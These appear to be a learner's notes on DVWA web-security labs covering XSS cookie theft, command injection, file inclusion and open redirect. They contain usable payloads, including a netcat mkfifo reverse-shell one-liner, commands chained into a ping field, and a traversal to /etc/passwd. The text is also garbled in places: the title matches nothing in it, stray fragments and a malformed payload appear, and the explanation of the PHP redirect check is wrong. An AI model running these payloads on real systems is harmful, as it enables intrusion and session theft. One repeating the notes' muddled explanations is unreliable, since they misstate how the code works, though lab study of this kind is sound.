# Decryption of Hash Value

Understanding the HTML Code. We need to understand what exactly the body part is.

```html
<script> alert("Hello");</script>
```

This is called XSS. Whenever this script is being called, all the items will have the entry of the following script you inserted in the inputs. 

PHPSESSID is required for session hijacking, meaning through this you'd be able to hijack the session using the following sessionid, but remember that this is only valid for the PHPSESSID, meaning it works in case of PHP only.

# What needs to be done?

- Go to the website, and run the above script and this script is used to check or learn the 

```
<script> alert(document.cookie); </script>
```

- Now you need to go to the website, but now you have the session id, and now go to the burpsuite and try the same sessionid with the same session id on cookie. Thus, now you can perform the attack, as you are able to login to the system. 

- 10101

- You can go to the DVWA and also look for the XSS.

- You can also do this using the url, meaning you can change the *name* in File Autentication method, writing the same inputs of `script` would do.

```
?name=<script>alert("Hello"<%@F>)>
```

# Command Injection Attack 

Command Injection is the paradigm of exploiting the vulnerability where attacker is able to identify the code loophole, where anyone might use the input methods to execute malicious file and able to hack the whole system and through this the attacker will be able to create **backdoor** for themselves. This can be done in the following way. First identify the code injection point, and then make sure that you've included the file on the server and the you need to execute the file on the server.

Another method is Reverse Shell Direction, where you can execute the following command to create a  session that is listening on the particular port.

```
nc -nlvp 1337
```

After this you need to execute the following command to redirect the shell command to your own server.

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /your/shell/path -i 2>&1 | nc <localhost/IPAddress> 1337 > /tmp/f
```

The following code will redirect the shell command. This was about the Low sercurity, what if we want to break the medium security, meaning what about breaking the code on *Medium Level*. So, *To break the code at Medium Level*, view the source code and try breaking the code, where they say trying running the *ping* in the background. 

```
127.0.0.1 & ls -la & pwd & whoami & hostname
```

What `&` does is that it allows you to run the command in the background. Through this you are able to breach the security. The Attacker may use as any unauthorised access of the system, where attacker will user various input methods vulnerability and will be able to find his way into the system.

# File Inclusion Vulnerability

File Inclusion is the method of uploading the file that is corrupted and making use of it for creating the backdoor through the file. Say it could be any shell file or any other file that will execute the corrupted code.

Baiscally there are two kinds one is LFI (Local File Inclusion), meaning if the file was moved locally and another is RFI (Remote File Inclusion), meaning when the file was included remotely over the server. Normally it is where one vulnerability is found where the input is taken by the users without **sanitizing** the filename, popularly an attacker could replace a filename `image.jpg` with some payload.

Normally what they do is that they traverse the directory, which is called **directory traversal payload** that escapes the script directory and traverses the filesystem directory structure, thus it could expose the sensitive file as below:

```
foo.php?file=../../../../../../../../../etc/passwd
```


# Open HTTP Redirection

*What is HTTP Redirection?* It is caused due to the input validation flaw where user input is trusted that leads to external URL to some target site, or it could be malicious. This is basically used as phishing attack that can used to redirect the users to another website. This happens when the code takes the input without validating that the input is carrying a URL that is redirecting the user to another website.

Consider the code below:

```
<?php

if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != "") {
    if (preg_match ("/http:\/\/|https:\/\//i", $_GET['redirect'])) {
        http_response_code (500);
        ?>
        <p>Absolute URLs not allowed.</p>
        <?php
        exit;
    } else {
        header ("location: " . $_GET['redirect']);
        exit;
    }
}

http_response_code (500);
?>
<p>Missing redirect target.</p>
<?php
exit;
?>
```

The line `if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != "")` checks whether the file input is not having any abosolute path to any website, this one ensures the security of the user, and doesn't fully trust the user input. 

Refer to [Test for Client Side URL Redirection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/04-Testing_for_Client_Side_URL_Redirect) in order you want to learn more about it.

# How to Start the FTP Redirection?

The FTP Redirection can be enabled using the following steps:

- You need to `allow` for the configuration. 